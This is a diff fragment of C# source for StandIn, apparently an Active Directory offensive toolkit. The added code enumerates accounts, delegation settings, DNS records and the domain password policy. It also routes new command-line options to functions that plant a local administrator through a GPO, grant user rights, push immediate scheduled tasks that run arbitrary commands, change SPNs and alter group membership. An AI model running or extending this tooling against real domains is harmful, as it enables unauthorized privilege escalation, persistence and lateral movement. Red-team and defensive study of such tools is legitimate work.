+                                Console.WriteLine("    lastlogon                : 0x7FFFFFFFFFFFFFFF");
+                            }
+                            else if (logonTimestamp == 0)
+                            {
+                                Console.WriteLine("    lastlogon                : 0x0");
+                            }
+                            else
+                            {
+                                Console.WriteLine("    lastlogon                : " + DateTime.FromFileTimeUtc((long)omProps["lastlogon"][0]) + " UTC");
+                            }
+                        }
+                        catch
+                        {
+                            try
+                            {
+                                long logonTimestamp = (long)omProps["lastlogontimestamp"][0];
+                                if (logonTimestamp == long.MaxValue)
+                                {
+                                    Console.WriteLine("    lastlogontimestamp       : 0x7FFFFFFFFFFFFFFF");
+                                }
+                                else if (logonTimestamp == 0)
+                                {
+                                    Console.WriteLine("    lastlogontimestamp       : 0x0");
+                                }
+                                else
+                                {
+                                    Console.WriteLine("    lastlogontimestamp       : " + DateTime.FromFileTimeUtc((long)omProps["lastlogontimestamp"][0]) + " UTC");
+                                }
+                            }
+                            catch
+                            {
+                                Console.WriteLine("    lastlogontimestamp       : N/A");
+                            }
+                        }
+
+                        UInt32 iDelegateCount = 0;
+                        foreach (Object oColl in omProps["msds-allowedtodelegateto"])
+                        {
+                            if (iDelegateCount == 0)
+                            {
+                                Console.WriteLine("    msDS-AllowedToDelegateTo : " + oColl);
+                            }
+                            else
+                            {
+                                Console.WriteLine("                               " + oColl);
+                            }
+                            iDelegateCount += 1;
+                        }
+                        Console.WriteLine("    userAccountControl       : " + (hStandIn.USER_ACCOUNT_CONTROL)omProps["useraccountcontrol"][0]);
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine("[!] Failed to enumerate DirectoryEntry properties..");
+                        if (ex.InnerException != null)
+                        {
+                            Console.WriteLine("    |_ " + ex.InnerException.Message);
+                        }
+                        else
+                        {
+                            Console.WriteLine("    |_ " + ex.Message);
+                        }
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[!] Failed to enumerate accounts..");
+                if (ex.InnerException != null)
+                {
+                    Console.WriteLine("    |_ " + ex.InnerException.Message);
+                }
+                else
+                {
+                    Console.WriteLine("    |_ " + ex.Message);
+                }
+            }
+        }
+
         public static void setASREP(String sObject, Boolean sRemove = false, String sDomain = "", String sUser = "", String sPass = "")
         {
             // Create searcher
@@ -1502,6 +3038,292 @@ namespace StandIn
             }
         }
 
+        public static void StringToUserOrSID(String sUserId, String sDomain = "", String sUser = "", String sPass = "")
+        {
+            // Create searcher
+            hStandIn.SearchObject so = hStandIn.createSearchObject(sDomain, sUser, sPass);
+            if (!so.success)
+            {
+                Console.WriteLine("[!] Failed to create directory searcher..");
+                return;
+            }
+            DirectorySearcher ds = so.searcher;
+
+            String sUserSam = String.Empty;
+            String sUserSID = String.Empty;
+
+            // Search filter
+            ds.Filter = "samaccountname=" + sUserId;
+            try
+            {
+                SearchResultCollection oObject = ds.FindAll();
+                if (oObject.Count == 1)
+                {
+
+                } else
+                {
+                    ds.Filter = "objectsid=" + sUserId;
+                    oObject = ds.FindAll();
+                    if (oObject.Count == 1)
+                    {
+
+                    }
+                    else
+                    {
+                        Console.WriteLine("[!] User identity not found..");
+                        return;
+                    }
+                }
+
+                foreach (SearchResult sr in oObject)
+                {
+                    DirectoryEntry mde = sr.GetDirectoryEntry();
+                    Console.WriteLine("[?] Object   : " + mde.Name);
+                    Console.WriteLine("    Path     : " + mde.Path);
+                    ResultPropertyCollection omProps = sr.Properties;
+
+                    sUserSID = new SecurityIdentifier((Byte[])omProps["objectsid"][0], 0).ToString();
+                    MatchCollection mc = Regex.Matches(mde.Path, @"DC=(\w+)");
+                    foreach (Match m in mc)
+                    {
+                        if (String.IsNullOrEmpty(sUserSam))
+                        {
+                            sUserSam += (m.Groups[1].Value).ToUpper();
+                        } else
+                        {
+                            sUserSam += "." + (m.Groups[1].Value).ToUpper();
+                        }
+                    }
+
+                    sUserSam += "\\" + omProps["samaccountname"][0];
+
+                    Console.WriteLine("\n[+] User     : " + sUserSam);
+                    Console.WriteLine("    SID      : " + sUserSID);
+                }
+            } catch
+            {
+                Console.WriteLine("[!] Failed to identify user..");
+                return;
+            }
+        }
+
+        public static void AdiDNSDump(String sFilter, String sDomain = "", String sUser = "", String sPass = "", Boolean bLegacy = false, Boolean bForest = false, UInt32 iLimit = 0)
+        {
+            try
+            {
+                DirectoryEntry rootdse = null;
+                DirectoryEntry defNC = null;
+                String sUserDomain = String.Empty;
+                if (!String.IsNullOrEmpty(sDomain) && !String.IsNullOrEmpty(sUser) && !String.IsNullOrEmpty(sPass))
+                {
+                    sUserDomain = String.Format("{0}\\{1}", sDomain, sUser);
+                    rootdse = new DirectoryEntry("LDAP://RootDSE", sUserDomain, sPass);
+                }
+                else
+                {
+                    rootdse = new DirectoryEntry("LDAP://RootDSE");
+                }
+
+                // Build path
+                String sDomRoot = rootdse.Properties["defaultNamingContext"].Value.ToString();
+                String sForestRoot = rootdse.Properties["rootDomainNamingContext"].Value.ToString();
+                String sSearchBase = String.Empty;
+                MatchCollection mc = Regex.Matches(sDomRoot, @"DC=(\w+)");
+                foreach (Match m in mc)
+                {
+                    if (String.IsNullOrEmpty(sSearchBase))
+                    {
+                        sSearchBase += "DC=" + (m.Groups[1].Value);
+                    }
+                    else
+                    {
+                        sSearchBase += "." + (m.Groups[1].Value);
+                    }
+                }
+
+                if (!bLegacy && !bForest)
+                {
+                    sSearchBase += ",CN=MicrosoftDNS,DC=DomainDnsZones," + sDomRoot;
+                } else
+                {
+                    if (bLegacy)
+                    {
+                        sSearchBase += ",CN=MicrosoftDNS,CN=System," + sDomRoot;
+                    } else
+                    {
+                        sSearchBase += ",CN=MicrosoftDNS,DC=ForestDnsZones," + sForestRoot;
+                    }
+                }
+
+                // Search details
+                if (iLimit == 0)
+                {
+                    // If unspecified == 50
+                    iLimit = 50;
+                }
+
+                Console.WriteLine("\n[+] Search Base  : LDAP://" + sSearchBase);
+                Console.WriteLine("[?] Result limit : " + iLimit);
+                
+                if (!String.IsNullOrEmpty(sDomain) && !String.IsNullOrEmpty(sUser) && !String.IsNullOrEmpty(sPass))
+                {
+                    defNC = new DirectoryEntry("LDAP://" + sSearchBase, sUserDomain, sPass);
+                }
+                else
+                {
+                    defNC = new DirectoryEntry("LDAP://" + sSearchBase);
+                }
+
+                // Search
+                DirectorySearcher ds = new DirectorySearcher(defNC);
+                ds.SearchScope = System.DirectoryServices.SearchScope.OneLevel;
+                ds.PropertiesToLoad.Add("name");
+                ds.PropertiesToLoad.Add("dnsRecord");
+                if (!String.IsNullOrEmpty(sFilter))
+                {
+                    ds.Filter = String.Format("(&(objectClass=*)(name=*)(dnsRecord=*)(|(name=*{0}*)(name={0}*)(name=*{0})))", sFilter);
+                } else
+                {
+                    ds.Filter = "(&(objectClass=*)(name=*)(dnsRecord=*))";
+                }
+                SearchResultCollection src = ds.FindAll();
+
+                foreach (SearchResult sr in src)
+                {
+                    Console.WriteLine("\n[+] Object : " + sr.Properties["name"][0].ToString());
+                    hStandIn.ReadDNSObject((Byte[])sr.Properties["dnsRecord"][0]);
+
+                    // Should we exit?
+                    iLimit -= 1;
+                    if (iLimit == 0)
+                    {
+                        break;
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[!] Failed to enumerate DNS data..");
+                if (ex.InnerException != null)
+                {
+                    Console.WriteLine("    |_ " + ex.InnerException.Message);
+                }
+                else
+                {
+                    Console.WriteLine("    |_ " + ex.Message);
+                }
+            }
+        }
+
+        public static void getDomainPolicy(String sFilter, String sDomain = "", String sUser = "", String sPass = "")
+        {
+            // Create searcher
+            hStandIn.SearchObject so = hStandIn.createSearchObject(sDomain, sUser, sPass);
+            if (!so.success)
+            {
+                Console.WriteLine("[!] Failed to create directory searcher..");
+                return;
+            }
+            DirectorySearcher ds = so.searcher;
+
+            // Search filter
+            if (String.IsNullOrEmpty(sFilter))
+            {
+                ds.Filter = "(&(displayName=Default Domain Policy)(gpcfilesyspath=*))";
+            }
+            else
+            {
+                ds.Filter = String.Format("(&(gpcfilesyspath=*)(displayName={0}))", sFilter);
+            }
+
+            // Enum
+            try
+            {
+                // Search
+                SearchResultCollection oObject = ds.FindAll();
+                if (oObject.Count == 0)
+                {
+                    Console.WriteLine("[!] LDAP search did not return any results..");
+                    return;
+                }
+
+                SearchResult sr = oObject[0];
+                DirectoryEntry mde = sr.GetDirectoryEntry();
+                ResultPropertyCollection omProps = sr.Properties;
+
+                Console.WriteLine("\n[?] Object      : " + mde.Name);
+                Console.WriteLine("    Path        : " + mde.Path);
+                String sPolicyRoot = omProps["gpcfilesyspath"][0].ToString();
+                Console.WriteLine("    Policy Root : " + sPolicyRoot);
+
+                // retrieve object properties
+                if (!Directory.Exists(sPolicyRoot))
+                {
+                    Console.WriteLine("\n[!] GPO path not found..");
+                    return;
+                }
+
+                // Check/create relevant path
+                if (!Directory.Exists(sPolicyRoot + @"\Machine\Microsoft\Windows NT\SecEdit\"))
+                {
+                    Console.WriteLine("\n[!] SecEdit folder not found..");
+                    return;
+                }
+
+                if (File.Exists(sPolicyRoot + @"\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf"))
+                {
+                    try
+                    {
+                        String sTmpl = File.ReadAllText(sPolicyRoot + @"\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf");
+                        Console.WriteLine("\n[+] Domain Policy");
+
+                        List<String> propList = new List<String>(new String[] { "MinimumPasswordAge", "MaximumPasswordAge", "MinimumPasswordLength", "PasswordComplexity", "PasswordHistorySize", "LockoutBadCount", "ResetLockoutCount", "LockoutDuration", "LSAAnonymousNameLookup", "MaxTicketAge", "MaxServiceAge", "MaxRenewAge" });
+
+                        UInt32 iResCount = 0;
+                        foreach (String sProp in propList)
+                        {
+                            Match ma = Regex.Match(sTmpl, sProp + @"\s=\s(.+)");
+                            if (ma.Success)
+                            {
+                                iResCount += 1;
+                                if (sProp == "MaxTicketAge")
+                                {
+                                    Console.WriteLine("    |_ Kerberos max User ticket lifetime : " + ma.Groups[1].Value);
+                                } else if (sProp == "MaxServiceAge")
+                                {
+                                    Console.WriteLine("    |_ Kerberos max Service ticket lifetime : " + ma.Groups[1].Value);
+                                } else if (sProp == "MaxRenewAge")
+                                {
+                                    Console.WriteLine("    |_ Kerberos max User ticket renewal lifetime : " + ma.Groups[1].Value);
+                                } else
+                                {
+                                    Console.WriteLine("    |_ " + sProp + " : " + ma.Groups[1].Value);
+                                }
+                            }
+                        }
+                        if (iResCount == 0)
+                        {
+                            Console.WriteLine("\n[!] No properties found, are you sure this is the correct GPO..");
+                            return;
+                        }
+                    } catch
+                    {
+                        Console.WriteLine("\n[!] Unable to parse GptTmpl..");
+                        return;
+                    }
+                } else
+                {
+                    Console.WriteLine("\n[!] GptTmpl not found..");
+                    return;
+                }
+            }
+            catch
+            {
+                Console.WriteLine("[!] Failed to enumerate domain policy..");
+                return;
+            }
+        }
+
         // Args
         class ArgOptions
         {
@@ -1541,6 +3363,45 @@ namespace StandIn
             [Option(null, "guid")]
             public String sGUID { get; set; }
 
+            [Option(null, "filter")]
+            public String sFilter { get; set; }
+
+            [Option(null, "ldap")]
+            public String sLdap { get; set; }
+
+            [Option(null, "localadmin")]
+            public String sLocalAdmin { get; set; }
+
+            [Option(null, "setuserrights")]
+            public String sSetUserRights { get; set; }
+
+            [Option(null, "tasktype")]
+            public String sTaskType { get; set; }
+
+            [Option(null, "taskname")]
+            public String sTaskName { get; set; }
+
+            [Option(null, "author")]
+            public String sAuthor { get; set; }
+
+            [Option(null, "command")]
+            public String sCommand { get; set; }
+
+            [Option(null, "args")]
+            public String sArgs { get; set; }
+
+            [Option(null, "target")]
+            public String sTarget { get; set; }
+
+            [Option(null, "targetsid")]
+            public String sTargetSID { get; set; }
+
+            [Option(null, "setspn")]
+            public String sSetSPN { get; set; }
+
+            [Option(null, "principal")]
+            public String sPrincipal { get; set; }
+
             [Option(null, "delegation")]
             public Boolean bDelegation { get; set; }
 
@@ -1556,6 +3417,9 @@ namespace StandIn
             [Option(null, "remove")]
             public Boolean bRemove { get; set; }
 
+            [Option(null, "add")]
+            public Boolean bAdd { get; set; }
+
             [Option(null, "make")]
             public Boolean bMake { get; set; }
 
@@ -1570,6 +3434,33 @@ namespace StandIn
 
             [Option(null, "help")]
             public Boolean bHelp { get; set; }
+
+            [Option(null, "gpo")]
+            public Boolean bGPO { get; set; }
+
+            [Option(null, "acl")]
+            public Boolean bACL { get; set; }
+
+            [Option(null, "increase")]
+            public Boolean bIncrease { get; set; }
+
+            [Option(null, "dns")]
+            public Boolean bDNS { get; set; }
+
+            [Option(null, "policy")]
+            public Boolean bPolicy { get; set; }
+
+            [Option(null, "passnotreq")]
+            public Boolean bPasswdnotreqd { get; set; }
+
+            [Option(null, "legacy")]
+            public Boolean bLegacy { get; set; }
+
+            [Option(null, "forest")]
+            public Boolean bForest { get; set; }
+
+            [Option(null, "limit")]
+            public UInt32 iLimit { get; set; }
         }
 
         static void Main(string[] args)
@@ -1583,7 +3474,7 @@ namespace StandIn
                 }
                 else
                 {
-                    if (!String.IsNullOrEmpty(ArgOptions.sComp) || !String.IsNullOrEmpty(ArgOptions.sObject) || !String.IsNullOrEmpty(ArgOptions.sGroup) || ArgOptions.bSPN || ArgOptions.bDelegation || ArgOptions.bAsrep || ArgOptions.bDc)
+                    if (!String.IsNullOrEmpty(ArgOptions.sComp) || !String.IsNullOrEmpty(ArgOptions.sObject) || !String.IsNullOrEmpty(ArgOptions.sGroup) || !String.IsNullOrEmpty(ArgOptions.sLdap) || !String.IsNullOrEmpty(ArgOptions.sSid) || !String.IsNullOrEmpty(ArgOptions.sSetSPN) || ArgOptions.bSPN || ArgOptions.bDelegation || ArgOptions.bAsrep || ArgOptions.bDc || ArgOptions.bGPO || ArgOptions.bDNS || ArgOptions.bPolicy || ArgOptions.bPasswdnotreqd)
                     {
                         if (!String.IsNullOrEmpty(ArgOptions.sComp))
                         {
@@ -1611,6 +3502,10 @@ namespace StandIn
                             {
                                 Console.WriteLine("[!] Insufficient arguments provided with --computer..");
                             }
+                        }
+                        else if (!String.IsNullOrEmpty(ArgOptions.sSid))
+                        {
+                            StringToUserOrSID(ArgOptions.sSid, ArgOptions.sDomain, ArgOptions.sUser, ArgOptions.sPass);
                         }
                         else if (!String.IsNullOrEmpty(ArgOptions.sObject))
                         {
@@ -1658,14 +3553,20 @@ namespace StandIn
                             }
                             else
                             {
-                                returnObject(ArgOptions.sObject, ArgOptions.sDomain, ArgOptions.sUser, ArgOptions.sPass);
+                                returnObject(ArgOptions.sObject, ArgOptions.sDomain, ArgOptions.sUser, ArgOptions.sPass, ArgOptions.sFilter);
                             }
                         }
                         else if (!String.IsNullOrEmpty(ArgOptions.sGroup))
                         {
-                            if (!String.IsNullOrEmpty(ArgOptions.sNtaccount))
+                            if (!String.IsNullOrEmpty(ArgOptions.sNtaccount) && ArgOptions.bAdd || ArgOptions.bRemove)
                             {
-                                addUserToGroup(ArgOptions.sGroup, ArgOptions.sNtaccount, ArgOptions.sDomain, ArgOptions.sUser, ArgOptions.sPass);
+                                if (ArgOptions.bAdd)
+                                {
+                                    addUserToGroup(ArgOptions.sGroup, ArgOptions.sNtaccount, ArgOptions.sDomain, ArgOptions.sUser, ArgOptions.sPass);
+                                } else
+                                {
+                                    removeUserFromGroup(ArgOptions.sGroup, ArgOptions.sNtaccount, ArgOptions.sDomain, ArgOptions.sUser, ArgOptions.sPass);
+                                }
                             }
                             else
                             {
@@ -1687,6 +3588,55 @@ namespace StandIn
                         else if (ArgOptions.bDc)
                         {
                             GetADDomainControllers();
+                        }
+                        else if (!String.IsNullOrEmpty(ArgOptions.sLdap))
+                        {
+                            returnLDAP(ArgOptions.sLdap, ArgOptions.sDomain, ArgOptions.sUser, ArgOptions.sPass, ArgOptions.sFilter, ArgOptions.iLimit);
+                        }
+                        else if (ArgOptions.bGPO)
+                        {
+                            if (!String.IsNullOrEmpty(ArgOptions.sFilter) && !String.IsNullOrEmpty(ArgOptions.sLocalAdmin))
+                            {
+                                GPONewLocalAdmin(ArgOptions.sFilter, ArgOptions.sLocalAdmin, ArgOptions.sDomain, ArgOptions.sUser, ArgOptions.sPass);
+                            }
+                            else if (!String.IsNullOrEmpty(ArgOptions.sFilter) && !String.IsNullOrEmpty(ArgOptions.sSetUserRights) && !String.IsNullOrEmpty(ArgOptions.sGrant))
+                            {
+                                GPOAddUserRights(ArgOptions.sFilter, ArgOptions.sSetUserRights, ArgOptions.sGrant, ArgOptions.sDomain, ArgOptions.sUser, ArgOptions.sPass);
+                            }
+                            else if (!String.IsNullOrEmpty(ArgOptions.sFilter) && !String.IsNullOrEmpty(ArgOptions.sTaskType) && !String.IsNullOrEmpty(ArgOptions.sAuthor) && !String.IsNullOrEmpty(ArgOptions.sCommand))
+                            {
+                                GPOAddImmediateTask(ArgOptions.sFilter, ArgOptions.sTaskType, ArgOptions.sAuthor, ArgOptions.sCommand, ArgOptions.sTaskName, ArgOptions.sArgs, ArgOptions.sTarget, ArgOptions.sTargetSID, ArgOptions.sDomain, ArgOptions.sUser, ArgOptions.sPass);
+                            }
+                            else if (!String.IsNullOrEmpty(ArgOptions.sFilter) && ArgOptions.bIncrease)
+                            {
+                                GPOObjectIncCounter(ArgOptions.sFilter, ArgOptions.sTaskType, ArgOptions.sDomain, ArgOptions.sUser, ArgOptions.sPass);
+                            }
+                            else
+                            {
+                                returnGPOs(ArgOptions.sDomain, ArgOptions.sUser, ArgOptions.sPass, ArgOptions.sFilter, ArgOptions.iLimit, ArgOptions.bACL);
+                            }
+                        }
+                        else if (ArgOptions.bDNS)
+                        {
+                            AdiDNSDump(ArgOptions.sFilter, ArgOptions.sDomain, ArgOptions.sUser, ArgOptions.sPass, ArgOptions.bLegacy, ArgOptions.bForest, ArgOptions.iLimit);
+                        }
+                        else if (ArgOptions.bPolicy)
+                        {
+                            getDomainPolicy(ArgOptions.sFilter, ArgOptions.sDomain, ArgOptions.sUser, ArgOptions.sPass);
+                        }
+                        else if (ArgOptions.bPasswdnotreqd)
+                        {
+                            getPassNotReqdAccounts(ArgOptions.sDomain, ArgOptions.sUser, ArgOptions.sPass);
+                        }
+                        else if (!String.IsNullOrEmpty(ArgOptions.sSetSPN))
+                        {
+                            if (!String.IsNullOrEmpty(ArgOptions.sPrincipal) && ArgOptions.bAdd || ArgOptions.bRemove)
+                            {
+                                updateSPNProperty(ArgOptions.sSetSPN, ArgOptions.sPrincipal, ArgOptions.bAdd, ArgOptions.bRemove, ArgOptions.sDomain, ArgOptions.sUser, ArgOptions.sPass);
+                            } else
+                            {
+                                Console.WriteLine("[!] Insufficient arguments provided (--principal/add/remove)..");
+                            }
                         }
                     }
                     else
